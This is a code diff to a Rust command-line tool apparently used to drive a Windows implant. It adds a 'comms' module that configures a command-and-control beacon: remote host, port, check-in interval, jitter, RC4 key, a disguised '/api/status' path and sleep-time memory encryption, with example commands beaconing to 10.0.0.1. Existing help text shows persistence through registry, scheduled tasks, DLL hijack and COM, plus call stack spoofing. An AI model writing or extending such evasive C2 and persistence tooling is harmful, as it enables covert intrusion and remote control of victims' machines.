@@ -41,6 +41,14 @@ pub struct CLI {
     pub persist_method: String,
     pub persist_name: String,
     pub persist_target: String,
+    pub comms_channel: String,
+    pub comms_host: String,
+    pub comms_port: u16,
+    pub comms_interval: u32,
+    pub comms_jitter: u8,
+    pub comms_key: String,
+    pub comms_path: String,
+    pub comms_use_sleep_obfs: bool,
 }
 
 impl CLI {
@@ -84,6 +92,14 @@ impl CLI {
             persist_method: String::new(),
             persist_name: String::new(),
             persist_target: String::new(),
+            comms_channel: String::from("https"),
+            comms_host: String::new(),
+            comms_port: 443,
+            comms_interval: 60000,
+            comms_jitter: 15,
+            comms_key: String::new(),
+            comms_path: String::from("/api/status"),
+            comms_use_sleep_obfs: false,
         };
 
         let mut i = 1;
@@ -163,6 +179,7 @@ impl CLI {
                 "sleep" => cli.command = String::from("sleep"),
                 "spoof" => cli.command = String::from("spoof"),
                 "persist" => cli.command = String::from("persist"),
+                "comms" => cli.command = String::from("comms"),
                 "--parent" => {
                     i += 1;
                     if i < args.len() {
@@ -298,6 +315,60 @@ impl CLI {
                         cli.persist_target = args[i].clone();
                     }
                 }
+                "--channel" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.comms_channel = args[i].clone();
+                    }
+                }
+                "--host" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.comms_host = args[i].clone();
+                    }
+                }
+                "--comms-port" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.comms_port = args[i].parse().unwrap_or_else(|_| {
+                            eprintln!("Invalid port: {}", args[i]);
+                            process::exit(1);
+                        });
+                    }
+                }
+                "--interval" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.comms_interval = args[i].parse().unwrap_or_else(|_| {
+                            eprintln!("Invalid interval: {}", args[i]);
+                            process::exit(1);
+                        });
+                    }
+                }
+                "--jitter" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.comms_jitter = args[i].parse::<u8>().unwrap_or_else(|_| {
+                            eprintln!("Invalid jitter: {}", args[i]);
+                            process::exit(1);
+                        }).min(50);
+                    }
+                }
+                "--comms-key" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.comms_key = args[i].clone();
+                    }
+                }
+                "--path" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.comms_path = args[i].clone();
+                    }
+                }
+                "--sleep-obfs" => {
+                    cli.comms_use_sleep_obfs = true;
+                }
                 _ => {
                     eprintln!("Unknown argument: {}", args[i]);
                     print_help();
@@ -328,6 +399,16 @@ impl CLI {
         if cli.command == "persist" && cli.persist_method.is_empty() {
             eprintln!("ERROR: --method is required for persist command.");
             eprintln!("Methods: registry, schtask, wmi, hijack, com, service");
+            process::exit(1);
+        }
+
+        // Host is required for comms command (live mode)
+        if cli.command == "comms" && !cli.dry_run && cli.comms_host.is_empty() {
+            eprintln!("ERROR: --host is required for comms command.");
+            process::exit(1);
+        }
+        if cli.command == "comms" && !cli.dry_run && cli.comms_key.is_empty() {
+            eprintln!("ERROR: --comms-key is required for comms command.");
             process::exit(1);
         }
 
@@ -362,6 +443,7 @@ fn print_help() {
     println!("  sleep      Memory protection during sleep");
     println!("  spoof      Call stack management");
     println!("  persist    Persistence configuration module");
+    println!("  comms      Remote communication channel");
     println!();
     println!("OPTIONS:");
     println!("  -p, --pid <PID>       Target process ID (required)");
@@ -477,6 +559,21 @@ fn print_help() {
     println!("  badang-cli persist --method schtask --name SystemCheck --payload runner.exe -x -c");
     println!("  badang-cli persist --method hijack --name version.dll --target C:\\\\App --payload ver.dll -x -c");
     println!("  badang-cli persist --method com --target \"{{CLSID}}\" --payload server.dll -x -c");
+    println!();
+    println!("COMMS OPTIONS:");
+    println!("  --channel <CHAN>      Channel: https, dns, smb (default: https)");
+    println!("  --host <HOST>        Remote endpoint address (required)");
+    println!("  --comms-port <PORT>  Remote endpoint port (default: 443)");
+    println!("  --interval <MS>      Check-in interval in ms (default: 60000)");
+    println!("  --jitter <PCT>       Jitter percentage 0-50 (default: 15)");
+    println!("  --comms-key <HEX>    RC4 pre-shared key in hex (required)");
+    println!("  --path <PATH>        Check-in URI path (default: /api/status)");
+    println!("  --sleep-obfs         Enable memory encryption during sleep");
+    println!();
+    println!("COMMS EXAMPLES:");
+    println!("  badang-cli comms --host 10.0.0.1 --comms-port 443 --comms-key aabbccdd -x -c");
+    println!("  badang-cli comms --host 10.0.0.1 --comms-key aabbccdd --interval 30000 --jitter 20 -x -c");
+    println!("  badang-cli comms --host 10.0.0.1 --comms-key aabbccdd --sleep-obfs -x -c");
     println!();
     println!("WARNING: For authorized use only.");
 }
